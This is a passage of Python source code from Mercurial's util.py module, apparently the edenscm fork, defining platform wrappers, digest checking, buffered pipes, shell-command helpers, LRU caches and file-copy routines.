# util.py - Mercurial utility functions and platform specific implementations
#
#  Copyright 2005 K. Thananchayan <thananck@yahoo.com>
#  Copyright 2005-2007 Matt Mackall <mpm@selenic.com>
#  Copyright 2006 Vadim Gelfer <vadim.gelfer@gmail.com>
#
# This software may be used and distributed according to the terms of the
# GNU General Public License version 2 or any later version.

"""Mercurial utility functions and platform specific implementations.

This contains helper routines that are independent of the SCM core and
hide platform-specific details from the core.
"""

from __future__ import absolute_import, print_function

import abc
import bz2
import calendar
import codecs
import collections
import contextlib
import datetime
import errno
import functools
import gc
import hashlib
import imp
import itertools
import mmap
import os
import platform as pyplatform
import random
import re as remod
import shutil
import signal
import socket
import stat
import string
import subprocess
import sys
import tempfile
import textwrap
import time
import traceback
import warnings
import zlib

from . import encoding, error, fscap, i18n, policy, pycompat, urllibcompat


base85 = policy.importmod(r"base85")
osutil = policy.importmod(r"osutil")
parsers = policy.importmod(r"parsers")

b85decode = base85.b85decode
b85encode = base85.b85encode

cookielib = pycompat.cookielib
empty = pycompat.empty
httplib = pycompat.httplib
pickle = pycompat.pickle
queue = pycompat.queue
socketserver = pycompat.socketserver
stderr = pycompat.stderr
stdin = pycompat.stdin
stdout = pycompat.stdout
stringio = pycompat.stringio

httpserver = urllibcompat.httpserver
urlerr = urllibcompat.urlerr
urlreq = urllibcompat.urlreq

# workaround for win32mbcs
_filenamebytestr = pycompat.bytestr

try:
    xrange(0)
except NameError:
    xrange = range


def isatty(fp):
    try:
        return fp.isatty()
    except AttributeError:
        return False


# glibc determines buffering on first write to stdout - if we replace a TTY
# destined stdout with a pipe destined stdout (e.g. pager), we want line
# buffering
if isatty(stdout):
    stdout = os.fdopen(stdout.fileno(), pycompat.sysstr("wb"), 1)

if pycompat.iswindows:
    from . import windows as platform

    stdout = platform.winstdout(stdout)
else:
    from . import posix as platform

_ = i18n._

bindunixsocket = platform.bindunixsocket
cachestat = platform.cachestat
checkexec = platform.checkexec
checklink = platform.checklink
copymode = platform.copymode
executablepath = platform.executablepath
expandglobs = platform.expandglobs
explainexit = platform.explainexit
findexe = platform.findexe
getfstype = platform.getfstype
gethgcmd = platform.gethgcmd
getmaxrss = platform.getmaxrss
getpid = os.getpid
getuser = platform.getuser
groupmembers = platform.groupmembers
groupname = platform.groupname
hidewindow = platform.hidewindow
isexec = platform.isexec
islocked = platform.islocked
isowner = platform.isowner
listdir = osutil.listdir
localpath = platform.localpath
lookupreg = platform.lookupreg
makedir = platform.makedir
makelock = platform.makelock
nlinks = platform.nlinks
normpath = platform.normpath
normcase = platform.normcase
normcasespec = platform.normcasespec
normcasefallback = platform.normcasefallback
openhardlinks = platform.openhardlinks
oslink = platform.oslink
parsepatchoutput = platform.parsepatchoutput
pconvert = platform.pconvert
poll = platform.poll
popen = platform.popen
posixfile = platform.posixfile
quotecommand = platform.quotecommand
readlock = platform.readlock
readpipe = platform.readpipe
releaselock = platform.releaselock
removedirs = platform.removedirs
rename = platform.rename
samedevice = platform.samedevice
samefile = platform.samefile
samestat = platform.samestat
setbinary = platform.setbinary
setflags = platform.setflags
setsignalhandler = platform.setsignalhandler
shellquote = platform.shellquote
spawndetached = platform.spawndetached
split = platform.split
sshargs = platform.sshargs
statfiles = getattr(osutil, "statfiles", platform.statfiles)
statisexec = platform.statisexec
statislink = platform.statislink
syncfile = platform.syncfile
syncdir = platform.syncdir
testpid = platform.testpid
umask = platform.umask
unlink = platform.unlink
username = platform.username

try:
    recvfds = osutil.recvfds
except AttributeError:
    pass
try:
    setprocname = osutil.setprocname
except AttributeError:
    pass
try:
    unblocksignal = osutil.unblocksignal
except AttributeError:
    pass

# Python compatibility

_notset = object()

# disable Python's problematic floating point timestamps (issue4836)
# (Python hypocritically says you shouldn't change this behavior in
# libraries, and sure enough Mercurial is not a library.)
os.stat_float_times(False)


def safehasattr(thing, attr):
    # Use instead of the builtin ``hasattr``. (See
    # https://hynek.me/articles/hasattr/)
    return getattr(thing, attr, _notset) is not _notset


def bytesinput(fin, fout, *args, **kwargs):
    sin, sout = sys.stdin, sys.stdout
    try:
        sys.stdin, sys.stdout = encoding.strio(fin), encoding.strio(fout)
        return encoding.strtolocal(pycompat.rawinput(*args, **kwargs))
    finally:
        sys.stdin, sys.stdout = sin, sout


def bitsfrom(container):
    bits = 0
    for bit in container:
        bits |= bit
    return bits


# python 2.6 still have deprecation warning enabled by default. We do not want
# to display anything to standard user so detect if we are running test and
# only use python deprecation warning in this case.
_dowarn = bool(encoding.environ.get("HGEMITWARNINGS"))
if _dowarn:
    # explicitly unfilter our warning for python 2.7
    #
    # The option of setting PYTHONWARNINGS in the test runner was investigated.
    # However, module name set through PYTHONWARNINGS was exactly matched, so
    # we cannot set 'mercurial' and have it match eg: 'mercurial.scmutil'. This
    # makes the whole PYTHONWARNINGS thing useless for our usecase.
    warnings.filterwarnings(r"default", r"", DeprecationWarning, r"edenscm")


def nouideprecwarn(msg, version, stacklevel=1):
    """Issue an python native deprecation warning

    This is a noop outside of tests, use 'ui.deprecwarn' when possible.
    """
    if _dowarn:
        msg += (
            "\n(compatibility will be dropped after Mercurial-%s," " update your code.)"
        ) % version
        warnings.warn(msg, DeprecationWarning, stacklevel + 1)


DIGESTS = {"md5": hashlib.md5, "sha1": hashlib.sha1, "sha512": hashlib.sha512}
# List of digest types from strongest to weakest
DIGESTS_BY_STRENGTH = ["sha512", "sha1", "md5"]

for k in DIGESTS_BY_STRENGTH:
    assert k in DIGESTS


class digester(object):
    """helper to compute digests.

    This helper can be used to compute one or more digests given their name.

    >>> d = digester([b'md5', b'sha1'])
    >>> d.update(b'foo')
    >>> [k for k in sorted(d)]
    ['md5', 'sha1']
    >>> d[b'md5']
    'acbd18db4cc2f85cedef654fccc4a4d8'
    >>> d[b'sha1']
    '0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33'
    >>> digester.preferred([b'md5', b'sha1'])
    'sha1'
    """

    def __init__(self, digests, s=""):
        self._hashes = {}
        for k in digests:
            if k not in DIGESTS:
                raise Abort(_("unknown digest type: %s") % k)
            self._hashes[k] = DIGESTS[k]()
        if s:
            self.update(s)

    def update(self, data):
        for h in self._hashes.values():
            h.update(data)

    def __getitem__(self, key):
        if key not in DIGESTS:
            raise Abort(_("unknown digest type: %s") % k)
        return self._hashes[key].hexdigest()

    def __iter__(self):
        return iter(self._hashes)

    @staticmethod
    def preferred(supported):
        """returns the strongest digest type in both supported and DIGESTS."""

        for k in DIGESTS_BY_STRENGTH:
            if k in supported:
                return k
        return None


class digestchecker(object):
    """file handle wrapper that additionally checks content against a given
    size and digests.

        d = digestchecker(fh, size, {'md5': '...'})

    When multiple digests are given, all of them are validated.
    """

    def __init__(self, fh, size, digests):
        self._fh = fh
        self._size = size
        self._got = 0
        self._digests = dict(digests)
        self._digester = digester(self._digests.keys())

    def read(self, length=-1):
        content = self._fh.read(length)
        self._digester.update(content)
        self._got += len(content)
        return content

    def validate(self):
        if self._size != self._got:
            raise Abort(
                _("size mismatch: expected %d, got %d") % (self._size, self._got)
            )
        for k, v in self._digests.items():
            if v != self._digester[k]:
                # i18n: first parameter is a digest name
                raise Abort(
                    _("%s mismatch: expected %s, got %s") % (k, v, self._digester[k])
                )


try:
    buffer = buffer
except NameError:

    def buffer(sliceable, offset=0, length=None):
        if length is not None:
            return memoryview(sliceable)[offset : offset + length]
        return memoryview(sliceable)[offset:]


closefds = pycompat.isposix

_chunksize = 4096


class bufferedinputpipe(object):
    """a manually buffered input pipe

    Python will not let us use buffered IO and lazy reading with 'polling' at
    the same time. We cannot probe the buffer state and select will not detect
    that data are ready to read if they are already buffered.

    This class let us work around that by implementing its own buffering
    (allowing efficient readline) while offering a way to know if the buffer is
    empty from the output (allowing collaboration of the buffer with polling).

    This class lives in the 'util' module because it makes use of the 'os'
    module from the python stdlib.
    """

    def __init__(self, input):
        self._input = input
        self._buffer = []
        self._eof = False
        self._lenbuf = 0

    @property
    def hasbuffer(self):
        """True is any data is currently buffered

        This will be used externally a pre-step for polling IO. If there is
        already data then no polling should be set in place."""
        return bool(self._buffer)

    @property
    def closed(self):
        return self._input.closed

    def fileno(self):
        return self._input.fileno()

    def close(self):
        return self._input.close()

    def read(self, size):
        while (not self._eof) and (self._lenbuf < size):
            self._fillbuffer()
        return self._frombuffer(size)

    def readline(self, *args, **kwargs):
        if 1 < len(self._buffer):
            # this should not happen because both read and readline end with a
            # _frombuffer call that collapse it.
            self._buffer = ["".join(self._buffer)]
            self._lenbuf = len(self._buffer[0])
        lfi = -1
        if self._buffer:
            lfi = self._buffer[-1].find("\n")
        while (not self._eof) and lfi < 0:
            self._fillbuffer()
            if self._buffer:
                lfi = self._buffer[-1].find("\n")
        size = lfi + 1
        if lfi < 0:  # end of file
            size = self._lenbuf
        elif 1 < len(self._buffer):
            # we need to take previous chunks into account
            size += self._lenbuf - len(self._buffer[-1])
        return self._frombuffer(size)

    def _frombuffer(self, size):
        """return at most 'size' data from the buffer

        The data are removed from the buffer."""
        if size == 0 or not self._buffer:
            return ""
        buf = self._buffer[0]
        if 1 < len(self._buffer):
            buf = "".join(self._buffer)

        data = buf[:size]
        buf = buf[len(data) :]
        if buf:
            self._buffer = [buf]
            self._lenbuf = len(buf)
        else:
            self._buffer = []
            self._lenbuf = 0
        return data

    def _fillbuffer(self):
        """read data to the buffer"""
        data = os.read(self._input.fileno(), _chunksize)
        if not data:
            self._eof = True
        else:
            self._lenbuf += len(data)
            self._buffer.append(data)


def mmapread(fp):
    try:
        fd = getattr(fp, "fileno", lambda: fp)()
        return mmap.mmap(fd, 0, access=mmap.ACCESS_READ)
    except ValueError:
        # Empty files cannot be mmapped, but mmapread should still work.  Check
        # if the file is empty, and if so, return an empty buffer.
        if os.fstat(fd).st_size == 0:
            return ""
        raise


def popen2(cmd, env=None, newlines=False):
    # Setting bufsize to -1 lets the system decide the buffer size.
    # The default for bufsize is 0, meaning unbuffered. This leads to
    # poor performance on Mac OS X: http://bugs.python.org/issue4194
    p = subprocess.Popen(
        cmd,
        shell=True,
        bufsize=-1,
        close_fds=closefds,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        universal_newlines=newlines,
        env=env,
    )
    return p.stdin, p.stdout


def popen3(cmd, env=None, newlines=False):
    stdin, stdout, stderr, p = popen4(cmd, env, newlines)
    return stdin, stdout, stderr


def popen4(cmd, env=None, newlines=False, bufsize=-1):
    p = subprocess.Popen(
        cmd,
        shell=True,
        bufsize=bufsize,
        close_fds=closefds,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        universal_newlines=newlines,
        env=env,
    )
    return p.stdin, p.stdout, p.stderr, p


def version():
    """Return version information if available."""
    try:
        from . import __version__

        return __version__.version
    except ImportError:
        return "unknown"


def versiontuple(v=None, n=4):
    """Parses a Mercurial version string into an N-tuple.

    The version string to be parsed is specified with the ``v`` argument.
    If it isn't defined, the current Mercurial version string will be parsed.

    ``n`` can be 2, 3, or 4. Here is how some version strings map to
    returned values:

    >>> v = b'3.6.1+190-df9b73d2d444'
    >>> versiontuple(v, 2)
    (3, 6)
    >>> versiontuple(v, 3)
    (3, 6, 1)
    >>> versiontuple(v, 4)
    (3, 6, 1, '190-df9b73d2d444')

    >>> versiontuple(b'3.6.1+190-df9b73d2d444+20151118')
    (3, 6, 1, '190-df9b73d2d444+20151118')

    >>> v = b'3.6'
    >>> versiontuple(v, 2)
    (3, 6)
    >>> versiontuple(v, 3)
    (3, 6, None)
    >>> versiontuple(v, 4)
    (3, 6, None, None)

    >>> v = b'3.9-rc'
    >>> versiontuple(v, 2)
    (3, 9)
    >>> versiontuple(v, 3)
    (3, 9, None)
    >>> versiontuple(v, 4)
    (3, 9, None, 'rc')

    >>> v = b'3.9-rc+2-02a8fea4289b'
    >>> versiontuple(v, 2)
    (3, 9)
    >>> versiontuple(v, 3)
    (3, 9, None)
    >>> versiontuple(v, 4)
    (3, 9, None, 'rc+2-02a8fea4289b')
    """
    if not v:
        v = version()
    parts = remod.split("[\+-]", v, 1)
    if len(parts) == 1:
        vparts, extra = parts[0], None
    else:
        vparts, extra = parts

    vints = []
    for i in vparts.split("."):
        try:
            vints.append(int(i))
        except ValueError:
            break
    # (3, 6) -> (3, 6, None)
    while len(vints) < 3:
        vints.append(None)

    if n == 2:
        return (vints[0], vints[1])
    if n == 3:
        return (vints[0], vints[1], vints[2])
    if n == 4:
        return (vints[0], vints[1], vints[2], extra)


# used by parsedate
defaultdateformats = (
    "%Y-%m-%dT%H:%M:%S",  # the 'real' ISO8601
    "%Y-%m-%dT%H:%M",  #   without seconds
    "%Y-%m-%dT%H%M%S",  # another awful but legal variant without :
    "%Y-%m-%dT%H%M",  #   without seconds
    "%Y-%m-%d %H:%M:%S",  # our common legal variant
    "%Y-%m-%d %H:%M",  #   without seconds
    "%Y-%m-%d %H%M%S",  # without :
    "%Y-%m-%d %H%M",  #   without seconds
    "%Y-%m-%d %I:%M:%S%p",
    "%Y-%m-%d %H:%M",
    "%Y-%m-%d %I:%M%p",
    "%Y-%m-%d",
    "%m-%d",
    "%m/%d",
    "%m/%d/%y",
    "%m/%d/%Y",
    "%a %b %d %H:%M:%S %Y",
    "%a %b %d %I:%M:%S%p %Y",
    "%a, %d %b %Y %H:%M:%S",  #  GNU coreutils "/bin/date --rfc-2822"
    "%b %d %H:%M:%S %Y",
    "%b %d %I:%M:%S%p %Y",
    "%b %d %H:%M:%S",
    "%b %d %I:%M:%S%p",
    "%b %d %H:%M",
    "%b %d %I:%M%p",
    "%b %d %Y",
    "%b %d",
    "%H:%M:%S",
    "%I:%M:%S%p",
    "%H:%M",
    "%I:%M%p",
)

extendeddateformats = defaultdateformats + ("%Y", "%Y-%m", "%b", "%b %Y")


def cachefunc(func):
    """cache the result of function calls"""
    # XXX doesn't handle keywords args
    if func.__code__.co_argcount == 0:
        cache = []

        def f():
            if len(cache) == 0:
                cache.append(func())
            return cache[0]

        return f
    cache = {}
    if func.__code__.co_argcount == 1:
        # we gain a small amount of time because
        # we don't need to pack/unpack the list
        def f(arg):
            if arg not in cache:
                cache[arg] = func(arg)
            return cache[arg]

    else:

        def f(*args):
            if args not in cache:
                cache[args] = func(*args)
            return cache[args]

    return f


class cow(object):
    """helper class to make copy-on-write easier

    Call preparewrite before doing any writes.
    """

    def preparewrite(self):
        """call this before writes, return self or a copied new object"""
        if getattr(self, "_copied", 0):
            self._copied -= 1
            return self.__class__(self)
        return self

    def copy(self):
        """always do a cheap copy"""
        self._copied = getattr(self, "_copied", 0) + 1
        return self


class sortdict(collections.OrderedDict):
    """a simple sorted dictionary

    >>> d1 = sortdict([(b'a', 0), (b'b', 1)])
    >>> d2 = d1.copy()
    >>> d2
    sortdict([('a', 0), ('b', 1)])
    >>> d2.update([(b'a', 2), (b'c', 3)])
    >>> list(d2.keys())
    ['a', 'b', 'c']
    """

    if pycompat.ispypy:
        # __setitem__() isn't called as of PyPy 5.8.0
        def update(self, src):
            if isinstance(src, dict):
                src = src.iteritems()
            for k, v in src:
                self[k] = v


class altsortdict(sortdict):
    """alternative sortdict, slower, and changes order on setitem

    This is for compatibility. Do not use it in new code.

    >>> d1 = altsortdict([(b'a', 0), (b'b', 1)])
    >>> d2 = d1.copy()
    >>> d2.update([(b'a', 2)])
    >>> list(d2.keys()) # should still be in last-set order
    ['b', 'a']
    """

    def __setitem__(self, key, value):
        if key in self:
            del self[key]
        super(altsortdict, self).__setitem__(key, value)


class cowdict(cow, dict):
    """copy-on-write dict

    Be sure to call d = d.preparewrite() before writing to d.

    >>> a = cowdict()
    >>> a is a.preparewrite()
    True
    >>> b = a.copy()
    >>> b is a
    True
    >>> c = b.copy()
    >>> c is a
    True
    >>> a = a.preparewrite()
    >>> b is a
    False
    >>> a is a.preparewrite()
    True
    >>> c = c.preparewrite()
    >>> b is c
    False
    >>> b is b.preparewrite()
    True
    """


class cowsortdict(cow, sortdict):
    """copy-on-write sortdict

    Be sure to call d = d.preparewrite() before writing to d.
    """


class transactional(object):
    """Base class for making a transactional type into a context manager."""

    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def close(self):
        """Successfully closes the transaction."""

    @abc.abstractmethod
    def release(self):
        """Marks the end of the transaction.

        If the transaction has not been closed, it will be aborted.
        """

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        try:
            if exc_type is None:
                self.close()
        finally:
            self.release()


@contextlib.contextmanager
def acceptintervention(tr=None):
    """A context manager that closes the transaction on InterventionRequired

    If no transaction was provided, this simply runs the body and returns
    """
    if not tr:
        yield
        return
    try:
        yield
        tr.close()
    except error.InterventionRequired:
        tr.close()
        raise
    finally:
        tr.release()


class nullcontextmanager(object):
    def __enter__(self):
        return self

    def __exit__(self, exctype, excvalue, traceback):
        pass


@contextlib.contextmanager
def environoverride(name, value):
    origvalue = encoding.environ.get(name)
    try:
        encoding.environ[name] = value
        yield
    finally:
        if origvalue is None:
            del encoding.environ[name]
        else:
            encoding.environ[name] = origvalue


class mercurialmodule(object):
    """Provide 'mercurial' module compatibility. Used by legacy Python hooks."""

    def __init__(self):
        self._needdel = False

    def __enter__(self):
        if sys.modules.get("mercurial") is not sys.modules["edenscm.mercurial"]:
            assert "mercurial" not in sys.modules
            sys.modules["mercurial"] = sys.modules["edenscm.mercurial"]
            self._needdel = True
        return self

    def __exit__(self, exctype, excvalue, traceback):
        if self._needdel:
            del sys.modules["mercurial"]
            self._needdel = False


class _lrucachenode(object):
    """A node in a doubly linked list.

    Holds a reference to nodes on either side as well as a key-value
    pair for the dictionary entry.
    """

    __slots__ = (u"next", u"prev", u"key", u"value")

    def __init__(self):
        self.next = None
        self.prev = None

        self.key = _notset
        self.value = None

    def markempty(self):
        """Mark the node as emptied."""
        self.key = _notset


class lrucachedict(object):
    """Dict that caches most recent accesses and sets.

    The dict consists of an actual backing dict - indexed by original
    key - and a doubly linked circular list defining the order of entries in
    the cache.

    The head node is the newest entry in the cache. If the cache is full,
    we recycle head.prev and make it the new head. Cache accesses result in
    the node being moved to before the existing head and being marked as the
    new head node.
    """

    def __init__(self, max):
        self._cache = {}

        self._head = head = _lrucachenode()
        head.prev = head
        head.next = head
        self._size = 1
        self._capacity = max

    def __len__(self):
        return len(self._cache)

    def __contains__(self, k):
        return k in self._cache

    def __iter__(self):
        # We don't have to iterate in cache order, but why not.
        n = self._head
        for i in range(len(self._cache)):
            yield n.key
            n = n.next

    def __getitem__(self, k):
        node = self._cache[k]
        self._movetohead(node)
        return node.value

    def __setitem__(self, k, v):
        node = self._cache.get(k)
        # Replace existing value and mark as newest.
        if node is not None:
            node.value = v
            self._movetohead(node)
            return

        if self._size < self._capacity:
            node = self._addcapacity()
        else:
            # Grab the last/oldest item.
            node = self._head.prev

        # At capacity. Kill the old entry.
        if node.key is not _notset:
            del self._cache[node.key]

        node.key = k
        node.value = v
        self._cache[k] = node
        # And mark it as newest entry. No need to adjust order since it
        # is already self._head.prev.
        self._head = node

    def __delitem__(self, k):
        node = self._cache.pop(k)
        node.markempty()

        # Temporarily mark as newest item before re-adjusting head to make
        # this node the oldest item.
        self._movetohead(node)
        self._head = node.next

    # Additional dict methods.

    def get(self, k, default=None):
        try:
            return self._cache[k].value
        except KeyError:
            return default

    def clear(self):
        n = self._head
        while n.key is not _notset:
            n.markempty()
            n = n.next

        self._cache.clear()

    def copy(self):
        result = lrucachedict(self._capacity)
        n = self._head.prev
        # Iterate in oldest-to-newest order, so the copy has the right ordering
        for i in range(len(self._cache)):
            result[n.key] = n.value
            n = n.prev
        return result

    def _movetohead(self, node):
        """Mark a node as the newest, making it the new head.

        When a node is accessed, it becomes the freshest entry in the LRU
        list, which is denoted by self._head.

        Visually, let's make ``N`` the new head node (* denotes head):

            previous/oldest <-> head <-> next/next newest

            ----<->--- A* ---<->-----
            |                       |
            E <-> D <-> N <-> C <-> B

        To:

            ----<->--- N* ---<->-----
            |                       |
            E <-> D <-> C <-> B <-> A

        This requires the following moves:

           C.next = D  (node.prev.next = node.next)
           D.prev = C  (node.next.prev = node.prev)
           E.next = N  (head.prev.next = node)
           N.prev = E  (node.prev = head.prev)
           N.next = A  (node.next = head)
           A.prev = N  (head.prev = node)
        """
        head = self._head
        # C.next = D
        node.prev.next = node.next
        # D.prev = C
        node.next.prev = node.prev
        # N.prev = E
        node.prev = head.prev
        # N.next = A
        # It is tempting to do just "head" here, however if node is
        # adjacent to head, this will do bad things.
        node.next = head.prev.next
        # E.next = N
        node.next.prev = node
        # A.prev = N
        node.prev.next = node

        self._head = node

    def _addcapacity(self):
        """Add a node to the circular linked list.

        The new node is inserted before the head node.
        """
        head = self._head
        node = _lrucachenode()
        head.prev.next = node
        node.prev = head.prev
        node.next = head
        head.prev = node
        self._size += 1
        return node


def lrucachefunc(func):
    """cache most recent results of function calls"""
    cache = {}
    order = collections.deque()
    if func.__code__.co_argcount == 1:

        def f(arg):
            if arg not in cache:
                if len(cache) > 20:
                    del cache[order.popleft()]
                cache[arg] = func(arg)
            else:
                order.remove(arg)
            order.append(arg)
            return cache[arg]

    else:

        def f(*args):
            if args not in cache:
                if len(cache) > 20:
                    del cache[order.popleft()]
                cache[args] = func(*args)
            else:
                order.remove(args)
            order.append(args)
            return cache[args]

    return f


class propertycache(object):
    def __init__(self, func):
        self.func = func
        self.name = func.__name__

    def __get__(self, obj, type=None):
        result = self.func(obj)
        self.cachevalue(obj, result)
        return result

    def cachevalue(self, obj, value):
        # __dict__ assignment required to bypass __setattr__ (eg: repoview)
        obj.__dict__[self.name] = value


def clearcachedproperty(obj, prop):
    """clear a cached property value, if one has been set"""
    if prop in obj.__dict__:
        del obj.__dict__[prop]


def pipefilter(s, cmd):
    """filter string S through command CMD, returning its output"""
    p = subprocess.Popen(
        cmd,
        shell=True,
        close_fds=closefds,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    pout, perr = p.communicate(s)
    return pout


def tempfilter(s, cmd):
    """filter string S through a pair of temporary files with CMD.
    CMD is used as a template to create the real command to be run,
    with the strings INFILE and OUTFILE replaced by the real names of
    the temporary files generated."""
    inname, outname = None, None
    try:
        infd, inname = tempfile.mkstemp(prefix="hg-filter-in-")
        fp = os.fdopen(infd, pycompat.sysstr("wb"))
        fp.write(s)
        fp.close()
        outfd, outname = tempfile.mkstemp(prefix="hg-filter-out-")
        os.close(outfd)
        cmd = cmd.replace("INFILE", inname)
        cmd = cmd.replace("OUTFILE", outname)
        code = os.system(cmd)
        if pycompat.sysplatform == "OpenVMS" and code & 1:
            code = 0
        if code:
            raise Abort(_("command '%s' failed: %s") % (cmd, explainexit(code)))
        return readfile(outname)
    finally:
        try:
            if inname:
                os.unlink(inname)
        except OSError:
            pass
        try:
            if outname:
                os.unlink(outname)
        except OSError:
            pass


filtertable = {"tempfile:": tempfilter, "pipe:": pipefilter}


def filter(s, cmd):
    "filter a string through a command that transforms its input to its output"
    for name, fn in filtertable.iteritems():
        if cmd.startswith(name):
            return fn(s, cmd[len(name) :].lstrip())
    return pipefilter(s, cmd)


def binary(s):
    """return true if a string is binary data"""
    return bool(s and "\0" in s)


def increasingchunks(source, min=1024, max=65536):
    """return no less than min bytes per chunk while data remains,
    doubling min after each chunk until it reaches max"""

    def log2(x):
        if not x:
            return 0
        i = 0
        while x:
            x >>= 1
            i += 1
        return i - 1

    buf = []
    blen = 0
    for chunk in source:
        buf.append(chunk)
        blen += len(chunk)
        if blen >= min:
            if min < max:
                min = min << 1
                nmin = 1 << log2(blen)
                if nmin > min:
                    min = nmin
                if min > max:
                    min = max
            yield "".join(buf)
            blen = 0
            buf = []
    if buf:
        yield "".join(buf)


Abort = error.Abort


def always(fn):
    return True


def never(fn):
    return False


def _nogc(func):
    """disable garbage collector

    Python's garbage collector triggers a GC each time a certain number of
    container objects (the number being defined by gc.get_threshold()) are
    allocated even when marked not to be tracked by the collector. Tracking has
    no effect on when GCs are triggered, only on what objects the GC looks
    into. As a workaround, disable GC while building complex (huge)
    containers.

    This garbage collector issue have been fixed in 2.7. But it still affect
    CPython's performance.
    """

    def wrapper(*args, **kwargs):
        gcenabled = gc.isenabled()
        gc.disable()
        try:
            return func(*args, **kwargs)
        finally:
            if gcenabled:
                gc.enable()

    return wrapper


if pycompat.ispypy:
    # PyPy runs slower with gc disabled
    nogc = lambda x: x
else:
    nogc = _nogc


def pathto(root, n1, n2):
    """return the relative path from one place to another.
    root should use os.sep to separate directories
    n1 should use os.sep to separate directories
    n2 should use "/" to separate directories
    returns an os.sep-separated path.

    If n1 is a relative path, it's assumed it's
    relative to root.
    n2 should always be relative to root.
    """
    if not n1:
        return localpath(n2)
    if os.path.isabs(n1):
        if os.path.splitdrive(root)[0] != os.path.splitdrive(n1)[0]:
            return os.path.join(root, localpath(n2))
        n2 = "/".join((pconvert(root), n2))
    a, b = splitpath(n1), n2.split("/")
    a.reverse()
    b.reverse()
    while a and b and a[-1] == b[-1]:
        a.pop()
        b.pop()
    b.reverse()
    return pycompat.ossep.join(([".."] * len(a)) + b) or "."


def mainfrozen():
    """return True if we are a frozen executable.

    The code supports py2exe (most common, Windows only) and tools/freeze
    (portable, not much used).
    """
    return (
        safehasattr(sys, "frozen")
        or safehasattr(sys, "importers")  # new py2exe
        or imp.is_frozen(u"__main__")  # old py2exe
    )  # tools/freeze


# the location of data files matching the source code
if mainfrozen() and getattr(sys, "frozen", None) != "macosx_app":
    # executable version (py2exe) doesn't support __file__
    datapath = os.path.dirname(pycompat.sysexecutable)
elif "HGDATAPATH" in encoding.environ:
    datapath = encoding.environ["HGDATAPATH"]
else:
    datapath = os.path.dirname(pycompat.fsencode(__file__))

i18n.setdatapath(datapath)

_hgexecutable = None


def hgexecutable():
    """return location of the 'hg' executable.

    Defaults to $HG or 'hg' in the search path.
    """
    if _hgexecutable is None:
        hg = encoding.environ.get("HG")
        mainmod = sys.modules[pycompat.sysstr("__main__")]
        if hg:
            _sethgexecutable(hg)
        elif mainfrozen():
            if getattr(sys, "frozen", None) == "macosx_app":
                # Env variable set by py2app
                _sethgexecutable(encoding.environ["EXECUTABLEPATH"])
            else:
                _sethgexecutable(pycompat.sysexecutable)
        elif (
            os.path.basename(pycompat.fsencode(getattr(mainmod, "__file__", "")))
            == "hg"
        ):
            _sethgexecutable(pycompat.fsencode(mainmod.__file__))
        else:
            exe = findexe("hg") or os.path.basename(sys.argv[0])
            _sethgexecutable(exe)
    return _hgexecutable


def _sethgexecutable(path):
    """set location of the 'hg' executable"""
    global _hgexecutable
    _hgexecutable = path


def _isstdout(f):
    fileno = getattr(f, "fileno", None)
    return fileno and fileno() == sys.__stdout__.fileno()


def shellenviron(environ=None):
    """return environ with optional override, useful for shelling out"""

    def py2shell(val):
        "convert python object into string that is useful to shell"
        if val is None or val is False:
            return "0"
        if val is True:
            return "1"
        return str(val)

    env = dict(encoding.environ)
    if environ:
        env.update((k, py2shell(v)) for k, v in environ.iteritems())
    env["HG"] = hgexecutable()
    return env


def system(cmd, environ=None, cwd=None, out=None):
    """enhanced shell command execution.
    run with environment maybe modified, maybe in different dir.

    if out is specified, it is assumed to be a file-like object that has a
    write() method. stdout and stderr will be redirected to out."""
    try:
        stdout.flush()
    except Exception:
        pass
    cmd = quotecommand(cmd)
    env = shellenviron(environ)
    if out is None or _isstdout(out):
        rc = subprocess.call(cmd, shell=True, close_fds=closefds, env=env, cwd=cwd)
    else:
        proc = subprocess.Popen(
            cmd,
            shell=True,
            close_fds=closefds,
            env=env,
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        for line in iter(proc.stdout.readline, ""):
            out.write(line)
        proc.wait()
        rc = proc.returncode
    if pycompat.sysplatform == "OpenVMS" and rc & 1:
        rc = 0
    return rc


def checksignature(func):
    """wrap a function with code to check for calling errors"""

    def check(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except TypeError:
            if len(traceback.extract_tb(sys.exc_info()[2])) == 1:
                raise error.SignatureError
            raise

    return check


def copyfile(src, dest, hardlink=False, copystat=False, checkambig=False):
    """copy a file, preserving mode and optionally other stat info like
    atime/mtime

    checkambig argument is used with filestat, and is useful only if
    destination file is guarded by any lock (e.g. repo.lock or
    repo.wlock).

    copystat and checkambig should be exclusive.
    """
    assert not (copystat and checkambig)
    oldstat = None
    if os.path.lexists(dest):
        if checkambig:
            oldstat = checkambig and filestat.frompath(dest)
        unlink(dest)
    if hardlink:
        # Hardlinks are problematic on CIFS (issue4546), do not allow hardlinks
        # unless we are confident that dest is on a whitelisted filesystem.
        fstype = getfstype(os.path.dirname(dest))
        if not fscap.getfscap(fstype, fscap.HARDLINK):
            hardlink = False
    if hardlink:
        try:
            oslink(src, dest)
            return
        except (IOError, OSError):
            pass  # fall back to normal copy
    if os.path.islink(src):
        os.symlink(os.readlink(src), dest)
        # copytime is ignored for symlinks, but in general copytime isn't needed
        # for them anyway
    else:
        try:
            shutil.copyfile(src, dest)
            if copystat:
                # copystat also copies mode
                shutil.copystat(src, dest)
            else:
                shutil.copymode(src, dest)
                if oldstat and oldstat.stat:
                    newstat = filestat.frompath(dest)
                    if newstat.isambig(oldstat):
                        # stat of copied file is ambiguous to original one
                        advanced = (oldstat.stat.st_mtime + 1) & 0x7FFFFFFF
                        os.utime(dest, (advanced, advanced))
        except shutil.Error as inst:
            raise Abort(str(inst))


def copyfiles(src, dst, hardlink=None, num=0, progress=None):
    """Copy a directory tree using hardlinks if possible."""

    if os.path.isdir(src):
        if hardlink is None:
            hardlink = os.stat(src).st_dev == os.stat(os.path.dirname(dst)).st_dev
            if progress:
                progress._topic = _("linking") if hardlink else _("copying")
        os.mkdir(dst)
        for name, kind in listdir(src):
            srcname = os.path.join(src, name)
            dstname = os.path.join(dst, name)
